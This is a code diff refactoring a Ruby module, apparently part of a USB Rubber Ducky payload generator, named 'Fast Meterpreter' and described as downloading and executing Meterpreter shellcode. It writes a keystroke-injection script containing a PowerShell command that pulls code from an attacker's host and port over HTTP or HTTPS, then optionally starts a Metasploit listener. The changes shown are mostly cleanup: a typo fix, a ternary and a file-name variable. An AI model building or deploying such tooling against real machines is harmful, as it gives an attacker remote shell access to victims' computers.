@@ -2,7 +2,7 @@
 require 'skeleton'
 require 'metasploit'
 class FastMeterpreter < Skeleton
-  include Msf
+  include Msf::Options
   attr_reader :ducky
   self.title = 'Fast Meterpreter'
   self.description = 'Download and Execute meterpreter shellcode '
@@ -14,8 +14,8 @@ class FastMeterpreter < Skeleton
     @port = @server_setup.port
     @ssl = @server_setup.use_ssl?
     @payload = @msf.payload_select
-    @msf_host = @msf.host
-    @msf_post = @msf.port
+    @msf_host = msf_host
+    @msf_port = msf_port
   end
 
   def run
@@ -26,15 +26,12 @@ class FastMeterpreter < Skeleton
 
   def finish
     priv_choice = @ducky_writer.menu
-    File.open("#{text_path}#{self.class.title}.txt", 'w') do |f|
+    File.open("#{text_path}#{@file_name}.txt", 'w') do |f|
       f.write(@ducky_writer.write(priv_choice))
-      if @ssl
-        f.write(powershell_command("https://#{@host}:#{@port}"))
-      else
+      @ssl ? f.write(powershell_command("https://#{@host}:#{@port}")) :
         f.write(powershell_command("http://#{@host}:#{@port}"))
-      end
     end
-    Ducky::Compile.new("#{self.class.title}.txt")
+    Ducky::Compile.new("#{@file_name}.txt")
     @msf.start(@msf_host, @msf_port) if @msf.start_metasploit?
   end
 
